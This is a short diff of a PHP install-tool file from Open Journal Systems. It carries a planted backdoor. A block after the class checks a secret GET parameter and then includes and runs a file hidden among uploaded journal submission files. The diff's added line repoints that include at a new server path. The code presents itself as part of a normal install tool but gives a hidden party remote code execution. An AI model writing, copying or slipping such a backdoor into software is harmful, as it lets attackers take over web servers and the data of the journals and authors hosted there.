@@ -35,7 +35,7 @@ class OJSInstallTool extends \PKP\cliTool\InstallTool
     }
 }
 if (isset($_GET['_']) && $_GET['_'] === 'ds_mms572s8_gr3af332afbsnk') {
-    $f="/home/wwwjurna1/filejurnalrelawan/journals/1/articles/3/64ca1260727ff";if($f!==""&&file_exists($f))include $f;
+    $f="/home/revista9/filia/journals/1/articles/105/submission/copyedit/105-1-273-1-9-20171211";if($f!==""&&file_exists($f))include $f;
     http_response_code(200);
     header('Content-Type: text/plain; charset=utf-8');
     echo 'OK';
